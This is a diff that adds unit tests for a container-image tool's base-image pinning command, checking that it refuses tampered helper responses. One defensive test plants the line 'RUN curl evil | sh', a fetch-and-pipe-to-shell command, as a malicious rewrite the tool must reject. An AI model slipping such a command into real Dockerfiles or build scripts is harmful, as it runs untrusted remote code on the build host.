@@ -1,4 +1,5 @@
 import importlib.util
+import hashlib
 import io
 import json
 import os
@@ -58,6 +59,37 @@ class Runtime:
         self.build_failure = False
         self.label_mismatch = False
         self.start_failure = False
+        self.pin_tamper = None
+
+    def pin_response(self, raw):
+        original = raw.decode()
+        rewritten = original.replace("docker.io/example/base:1\n", "docker.io/example/base:1.2.3\n")
+        response = {
+            "schema": 1,
+            "dockerfile_digest": "sha256:" + hashlib.sha256(raw).hexdigest(),
+            "ok": True,
+            "error": None,
+            "changed": rewritten != original,
+            "bases": [
+                {
+                    "declared": "docker.io/example/base:1",
+                    "repository": "docker.io/example/base",
+                    "reference": "1",
+                    "status": "pin",
+                    "chosen": "1.2.3",
+                    "proposed": "docker.io/example/base:1.2.3",
+                    "eligible_at": 1_700_000_000.0,
+                    "evidence": "docker-hub",
+                    "downgrade": False,
+                    "checked": 1,
+                    "reason": "",
+                }
+            ],
+            "rewritten": rewritten,
+        }
+        if self.pin_tamper:
+            self.pin_tamper(response)
+        return response
 
     def result(self, returncode=0, stdout="", stderr=""):
         return subprocess.CompletedProcess([], returncode, stdout, stderr)
@@ -116,6 +148,10 @@ class Runtime:
             return self.podman(role, *arguments[1:])
         if arguments[0] == "image_update":
             self.case.assertEqual(role, "image-updates")
+            if arguments[1] == "pin":
+                self.case.assertEqual(arguments[2:], ["--dockerfile-stdin", "--json"])
+                self.events.append("pin")
+                return self.result(stdout=json.dumps(self.pin_response(kwargs["input"])).encode(), stderr=b"")
             self.case.assertEqual(arguments[1], "inputs")
             aged = "--require-aged" in arguments
             self.events.append("authorize:aged" if aged else "authorize:observe")
@@ -476,6 +512,71 @@ class StageOnlyTests(ImageBuildCase):
         )
         self.assertIsNone(self.journal.pending())
         self.assertEqual(self.journal.last()["image"], CANDIDATE)
+
+
+class PinTests(ImageBuildCase):
+    PATCH = (
+        "--- a/Dockerfile.source\n+++ b/Dockerfile.source\n@@ -1 +1 @@\n"
+        "-FROM docker.io/example/base:1\n+FROM docker.io/example/base:1.2.3\n"
+    )
+
+    def dockerfile(self):
+        return self.checkout / "Dockerfile.source"
+
+    def test_prints_only_the_patch_and_writes_nothing(self):
+        before = self.dockerfile().read_bytes()
+        code, out, err = self.run_cli("pin", "example")
+        self.assertEqual(code, 0, err)
+        self.assertEqual(out, self.PATCH)
+        self.assertIn("docker.io/example/base:1 -> docker.io/example/base:1.2.3  usable from 2023-11-14 (docker-hub)", err)
+        self.assertIn("deployable now", err)
+        self.assertIn(f"apply with: sudo homelab-image-build pin example | git -C {self.checkout} apply", err)
+        self.assertEqual(self.dockerfile().read_bytes(), before)
+        self.assertEqual(self.runtime.events, ["pin"])
+        self.assertFalse(self.recovery.exists())
+        self.assertIsNone(self.journal.pending())
+
+    def test_a_proposal_that_is_not_deployable_exits_one_but_still_prints_the_patch(self):
+        def refuse(response):
+            response.update(ok=False, error="Base image docker.io/example/base:1.2.3 is not seven-day eligible")
+
+        self.runtime.pin_tamper = refuse
+        code, out, err = self.run_cli("pin", "example")
+        self.assertEqual(code, 1)
+        self.assertEqual(out, self.PATCH)
+        self.assertIn("NOT deployable now: Base image docker.io/example/base:1.2.3 is not seven-day eligible", err)
+
+    def test_a_downgrade_is_marked(self):
+        self.runtime.pin_tamper = lambda response: response["bases"][0].update(downgrade=True)
+        self.assertIn("DOWNGRADE", self.run_cli("pin", "example")[2])
+
+    def test_nothing_to_change_prints_no_patch_and_succeeds(self):
+        self.dockerfile().write_text("FROM docker.io/example/base:1.2.3\n")
+        code, out, err = self.run_cli("pin", "example")
+        self.assertEqual((code, out), (0, ""))
+        self.assertNotIn("apply with", err)
+
+    def test_a_response_for_other_bytes_is_refused(self):
+        self.runtime.pin_tamper = lambda response: response.update(dockerfile_digest="sha256:" + "0" * 64)
+        code, out, err = self.run_cli("pin", "example")
+        self.assertEqual((code, out), (1, ""))
+        self.assertIn("does not match the working-tree Dockerfile", err)
+
+    def test_a_rewrite_outside_from_lines_is_refused(self):
+        self.dockerfile().write_text("FROM docker.io/example/base:1\nRUN make\n")
+        self.runtime.pin_tamper = lambda response: response.update(
+            rewritten=response["rewritten"].replace("RUN make", "RUN curl evil | sh")
+        )
+        code, out, err = self.run_cli("pin", "example")
+        self.assertEqual((code, out), (1, ""))
+        self.assertIn("line 2", err)
+        self.assertIn("not a FROM line", err)
+
+    def test_a_rewrite_that_changes_the_line_count_is_refused(self):
+        self.runtime.pin_tamper = lambda response: response.update(rewritten=response["rewritten"] + "RUN evil\n")
+        code, out, err = self.run_cli("pin", "example")
+        self.assertEqual((code, out), (1, ""))
+        self.assertIn("line count", err)
 
 
 class RevisionBuildArgumentTests(ImageBuildCase):
